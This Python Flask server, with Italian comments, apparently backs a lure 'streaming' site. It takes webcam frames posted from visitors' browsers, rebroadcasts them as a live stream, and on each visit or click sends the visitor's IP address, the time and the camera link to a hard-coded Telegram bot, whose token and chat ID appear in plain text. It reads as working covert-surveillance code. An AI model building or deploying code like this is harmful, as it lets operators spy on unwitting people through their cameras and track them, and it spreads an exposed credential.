from flask import Flask, request, jsonify, Response
from flask_cors import CORS
import requests
from datetime import datetime
import pytz
import base64
import threading
import os

app = Flask(__name__)
CORS(app)

# ⚠️ Credenziali Telegram
TELEGRAM_BOT_TOKEN = "7827685878:AAGo7ijMFJXrRGRTrXNxw7fLDHhKwbYLqDQ"
TELEGRAM_CHAT_ID = "7096713514"

# 🌐 URL pubblico del server
SERVER_URL = os.getenv("RENDER_EXTERNAL_URL", "http://localhost:5000").rstrip("/")

# Variabile globale per i frame video
latest_frame = None


def send_telegram_message(message):
    """Invia un messaggio al bot Telegram"""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "HTML"
    }
    try:
        response = requests.post(url, json=payload)
        return response.json()
    except Exception as e:
        print(f"❌ Errore nell'invio del messaggio Telegram: {e}")
        return None


def get_client_ip(request):
    """Ottiene l'IP reale del client considerando i proxy"""
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0]
    elif request.headers.get('X-Real-IP'):
        return request.headers.get('X-Real-IP')
    else:
        return request.remote_addr


# --------------------------
# SEZIONE VIDEO LIVE
# --------------------------

@app.route('/upload_frame', methods=['POST'])
def upload_frame():
    """Riceve i frame in base64 dal browser"""
    global latest_frame
    try:
        data = request.get_json()
        frame_data = data.get("frame")
        if frame_data:
            # Decodifica il frame base64
            latest_frame = base64.b64decode(frame_data.split(',')[1])
            print(f"[{datetime.now().strftime('%H:%M:%S')}] Frame ricevuto")
        return jsonify({"success": True})
    except Exception as e:
        print(f"❌ Errore ricezione frame: {e}")
        return jsonify({"success": False, "error": str(e)})


@app.route('/video')
def video_feed():
    """Ritorna lo streaming video in tempo reale"""
    def generate_frames():
        global latest_frame
        while True:
            if latest_frame:
                yield (b'--frame\r\n'
                       b'Content-Type: image/jpeg\r\n\r\n' + latest_frame + b'\r\n')
    
    return Response(generate_frames(),
                    mimetype='multipart/x-mixed-replace; boundary=frame')


# --------------------------
# SEZIONE TRACKING E HOME
# --------------------------

@app.route('/')
def home():
    """Home del sito — invia link camera via Telegram"""
    client_ip = get_client_ip(request)
    italy_tz = pytz.timezone('Europe/Rome')
    now = datetime.now(italy_tz)
    timestamp = now.strftime("%d/%m/%Y alle %H:%M:%S")

    video_link = f"{SERVER_URL}/video"

    message = f"""
🎯 <b>Nuovo Accesso al Sito!</b>

🕐 <b>Data e Ora:</b> {timestamp}
🌐 <b>Indirizzo IP:</b> {client_ip}
🎥 <b>Live Camera:</b> <a href="{video_link}">{video_link}</a>
"""

    # Invia messaggio in un thread separato per non bloccare la risposta
    threading.Thread(target=send_telegram_message, args=(message,)).start()

    return jsonify({
        "status": "online",
        "message": "Benvenuto nel Backend Streaming Hub!",
        "video_link": video_link
    })


@app.route('/track-click', methods=['POST'])
def track_click():
    """Riceve i click e invia notifica Telegram"""
    try:
        data = request.get_json()
        platform = data.get('platform', 'Sconosciuta')

        client_ip = get_client_ip(request)
        italy_tz = pytz.timezone('Europe/Rome')
        now = datetime.now(italy_tz)
        timestamp = now.strftime("%d/%m/%Y alle %H:%M:%S")

        message = f"""
🎬 <b>Nuovo Click Rilevato!</b>

📱 <b>Piattaforma:</b> {platform}
🕐 <b>Data e Ora:</b> {timestamp}
🌐 <b>Indirizzo IP:</b> {client_ip}
"""

        # Invia messaggio in un thread separato
        threading.Thread(target=send_telegram_message, args=(message,)).start()

        return jsonify({"success": True, "message": "Notifica inviata con successo"}), 200

    except Exception as e:
        print(f"❌ Errore: {e}")
        return jsonify({"success": False, "message": str(e)}), 500


if __name__ == '__main__':
    port = int(os.getenv("PORT", 5000))
    print(f"🚀 Server attivo su porta {port}")
    print(f"🌍 URL pubblico: {SERVER_URL}")
    print("🎥 Stream disponibile su /video")
    print("📤 Upload frame disponibile su /upload_frame")
    app.run(host='0.0.0.0', port=port, debug=True)